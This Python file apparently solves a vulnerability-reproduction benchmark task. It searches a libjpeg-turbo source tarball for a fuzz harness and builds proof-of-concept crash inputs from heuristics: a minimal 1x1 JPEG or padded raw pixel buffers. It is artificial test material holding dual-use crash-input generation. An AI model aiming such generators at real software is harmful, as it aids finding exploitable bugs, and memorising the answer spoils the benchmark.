import os
import re
import io
import tarfile
import struct
from typing import List, Optional, Tuple


def _read_tar_text_member(tar: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int = 2_000_000) -> Optional[str]:
    if not m.isfile():
        return None
    if m.size <= 0 or m.size > max_bytes:
        return None
    try:
        f = tar.extractfile(m)
        if f is None:
            return None
        data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return None
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return None
    except Exception:
        return None


def _is_source_like(name: str) -> bool:
    n = name.lower()
    if any(n.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc")):
        return True
    return False


def _looks_like_fuzzer_path(name: str) -> bool:
    n = name.lower()
    return ("fuzz" in n) or ("fuzzer" in n) or ("ossfuzz" in n) or ("oss-fuzz" in n)


def _fuzzer_relevance_score(path: str, text: str) -> int:
    p = path.lower()
    t = text
    score = 0
    if "llvmfuzzertestoneinput" in t.lower():
        score += 1000
    if "tj3compress" in t:
        score += 500
    if "tjcompress" in t:
        score += 400
    if "tj3transform" in t:
        score += 450
    if "tjtransform" in t:
        score += 350
    if "tj3alloc" in t:
        score += 100
    if "malloc" in t or "new " in t or "realloc" in t:
        score += 50
    if "transform" in p:
        score += 40
    if "compress" in p:
        score += 50
    if "decompress" in p:
        score -= 20
    if "tj3" in p:
        score += 20
    if _looks_like_fuzzer_path(path):
        score += 25
    return score


def _find_best_fuzzer_in_tar(src_path: str) -> Optional[Tuple[str, str]]:
    try:
        with tarfile.open(src_path, "r:*") as tar:
            best = None
            best_score = -10**9
            for m in tar.getmembers():
                if not _is_source_like(m.name):
                    continue
                if not _looks_like_fuzzer_path(m.name):
                    continue
                txt = _read_tar_text_member(tar, m)
                if not txt:
                    continue
                if "LLVMFuzzerTestOneInput" not in txt and "llvmfuzzertestoneinput" not in txt.lower():
                    continue
                s = _fuzzer_relevance_score(m.name, txt)
                if s > best_score:
                    best_score = s
                    best = (m.name, txt)
            if best is not None:
                return best

            # fallback: scan any source for fuzzer entry point
            for m in tar.getmembers():
                if not _is_source_like(m.name):
                    continue
                txt = _read_tar_text_member(tar, m)
                if not txt:
                    continue
                if "LLVMFuzzerTestOneInput" not in txt and "llvmfuzzertestoneinput" not in txt.lower():
                    continue
                s = _fuzzer_relevance_score(m.name, txt)
                if s > best_score:
                    best_score = s
                    best = (m.name, txt)
            return best
    except Exception:
        return None


def _guess_input_kind(path: str, text: str) -> str:
    t = text
    tl = t.lower()
    pl = path.lower()
    if "tj3compress" in t or "tjcompress" in t or "tjcompress2" in t or "tj3init(tjinit_compress" in tl:
        return "raw"
    if "tj3transform" in t or "tjtransform" in t or "tj3init(tjinit_transform" in tl:
        return "jpeg"
    if "tj3decompressheader" in tl or "tjdecompressheader" in tl or "jpeg_mem_src" in tl:
        return "jpeg"
    if "transform" in pl:
        return "jpeg"
    if "compress" in pl:
        return "raw"
    return "raw"


def _has_fuzzed_data_provider(text: str) -> bool:
    tl = text.lower()
    return ("fuzzeddataprovider" in tl) or ("consumeintegral" in tl) or ("consumebool" in tl) or ("consumebytes" in tl)


def _estimate_fdp_param_bytes_before_payload(text: str) -> int:
    # Heuristic: count consumption calls before first ConsumeBytes/ConsumeRemainingBytes that likely grabs pixel/JPEG data.
    tl = text.lower()
    idx = len(tl)
    for key in ("consumebytes", "consumeremainingbytes", "consumebyteswithterminator"):
        j = tl.find(key)
        if j != -1:
            idx = min(idx, j)
    head = text[:idx]

    size_map = {
        "uint8_t": 1, "int8_t": 1, "unsigned char": 1, "char": 1, "bool": 1,
        "uint16_t": 2, "int16_t": 2, "unsigned short": 2, "short": 2,
        "uint32_t": 4, "int32_t": 4, "unsigned int": 4, "int": 4, "float": 4,
        "uint64_t": 8, "int64_t": 8, "unsigned long": 8, "long": 8, "size_t": 8, "double": 8,
    }

    def type_size(type_str: str) -> int:
        ts = " ".join(type_str.strip().split())
        ts = ts.replace("const ", "").replace("&", "").replace("*", "").strip()
        if ts in size_map:
            return size_map[ts]
        if "uint8" in ts or "int8" in ts:
            return 1
        if "uint16" in ts or "int16" in ts:
            return 2
        if "uint64" in ts or "int64" in ts or "size_t" in ts or re.search(r"\blong\b", ts):
            return 8
        if "uint32" in ts or "int32" in ts:
            return 4
        if ts == "unsigned" or ts == "signed":
            return 4
        return 4

    total = 0

    # ConsumeBool()
    total += head.count("ConsumeBool(") * 1
    total += head.count("ConsumeBool()") * 1

    # ConsumeIntegral<type>(...) and ConsumeIntegralInRange<type>(...)
    for m in re.finditer(r"ConsumeIntegral(?:InRange)?\s*<\s*([^>]+)\s*>", head):
        total += type_size(m.group(1))

    # ConsumeEnum<type>(...) approximate as 4 bytes unless explicitly sized
    for m in re.finditer(r"ConsumeEnum\s*<\s*([^>]+)\s*>", head):
        total += type_size(m.group(1))

    # ConsumeIntegral(...) without template is rare; approximate 4 bytes per occurrence
    total += len(re.findall(r"\bConsumeIntegral\s*\(", head)) * 4
    total += len(re.findall(r"\bConsumeIntegralInRange\s*\(", head)) * 4

    # Clamp to a reasonable range
    if total <= 0:
        total = 64
    return min(max(total, 16), 512)


def _make_minimal_jpeg_1x1_gray() -> bytes:
    # Minimal baseline JPEG, 1x1, grayscale, with tiny custom Huffman tables.
    # DQT: 1 table, all ones
    dqt_vals = bytes([1] * 64)
    dqt = b"\xFF\xDB" + struct.pack(">H", 2 + 1 + 64) + b"\x00" + dqt_vals  # Pq/Tq=0

    # SOF0: 1 component, 1x1
    sof0 = b"\xFF\xC0" + struct.pack(">H", 8 + 3 * 1) + bytes([
        8,  # precision
        0, 1,  # height
        0, 1,  # width
        1,  # components
        1,  # component id
        0x11,  # sampling factors H=1,V=1
        0,  # quant table 0
    ])

    # DHT: DC table class=0, id=0, one symbol (0) of length 1
    bits_dc = bytes([1] + [0] * 15)
    vals_dc = bytes([0])
    dht_dc = b"\xFF\xC4" + struct.pack(">H", 2 + 1 + 16 + 1) + bytes([0x00]) + bits_dc + vals_dc

    # DHT: AC table class=1, id=0, one symbol (0x00 EOB) of length 1
    bits_ac = bytes([1] + [0] * 15)
    vals_ac = bytes([0x00])
    dht_ac = b"\xFF\xC4" + struct.pack(">H", 2 + 1 + 16 + 1) + bytes([0x10]) + bits_ac + vals_ac

    # SOS: 1 component, uses table 0 for DC/AC
    sos = b"\xFF\xDA" + struct.pack(">H", 6 + 2 * 1) + bytes([
        1,  # Ns
        1,  # Cs
        0x00,  # TdTa
        0,  # Ss
        63,  # Se
        0,  # AhAl
    ])

    # Entropy-coded data:
    # DC symbol 0 (code '0'), AC EOB symbol 0x00 (code '0') => bits "00", pad with 1s => 0x3F
    entropy = bytes([0x3F])

    return b"\xFF\xD8" + dqt + sof0 + dht_dc + dht_ac + sos + entropy + b"\xFF\xD9"


def _guess_direct_dim_bytes(text: str) -> int:
    tl = text.lower()
    if re.search(r"\bconsumeintegral(inrange)?\s*<\s*uint8_t\s*>", tl):
        return 1
    if re.search(r"\bconsumeintegral(inrange)?\s*<\s*uint16_t\s*>", tl):
        return 2
    if re.search(r"\bconsumeintegral(inrange)?\s*<\s*uint32_t\s*>", tl):
        return 4

    # Look for casts when reading from data pointer
    if re.search(r"\*\s*\(\s*const\s+uint16_t\s*\*\s*\)\s*data", tl) or re.search(r"\*\s*\(\s*uint16_t\s*\*\s*\)\s*data", tl):
        return 2
    if re.search(r"\*\s*\(\s*const\s+uint8_t\s*\*\s*\)\s*data", tl) or re.search(r"\*\s*\(\s*uint8_t\s*\*\s*\)\s*data", tl):
        return 1
    if re.search(r"\*\s*\(\s*const\s+uint32_t\s*\*\s*\)\s*data", tl) or re.search(r"\*\s*\(\s*uint32_t\s*\*\s*\)\s*data", tl):
        return 4

    # Most common is 32-bit int/unsigned
    return 4


def _make_raw_poc_from_text(path: str, text: str) -> bytes:
    if _has_fuzzed_data_provider(text):
        header_len = _estimate_fdp_param_bytes_before_payload(text)
        # Use 0x01 to avoid 0 values for dims/flags/bools, but keep values small under modulo ranges.
        header = b"\x01" * max(32, header_len)
        payload = b"\x00" * 96
        return header + payload

    dim_bytes = _guess_direct_dim_bytes(text)
    if dim_bytes == 1:
        wh = bytes([1, 1])
    elif dim_bytes == 2:
        wh = struct.pack("<HH", 1, 1)
    else:
        wh = struct.pack("<II", 1, 1)

    # Provide some extra bytes to satisfy additional params and pixel data needs.
    return wh + (b"\x00" * 64)


def _default_raw_poc_ground_truthish() -> bytes:
    # Likely format: width (LE32) + height (LE32) + RGB pixels.
    w = 30
    h = 30
    header = struct.pack("<II", w, h)
    pixels = b"\x00" * (w * h * 3)
    return header + pixels


class Solution:
    def solve(self, src_path: str) -> bytes:
        best = _find_best_fuzzer_in_tar(src_path)
        if best is None:
            return _default_raw_poc_ground_truthish()

        path, text = best
        kind = _guess_input_kind(path, text)
        if kind == "jpeg":
            return _make_minimal_jpeg_1x1_gray()

        poc = _make_raw_poc_from_text(path, text)
        if not poc:
            return _default_raw_poc_ground_truthish()
        return poc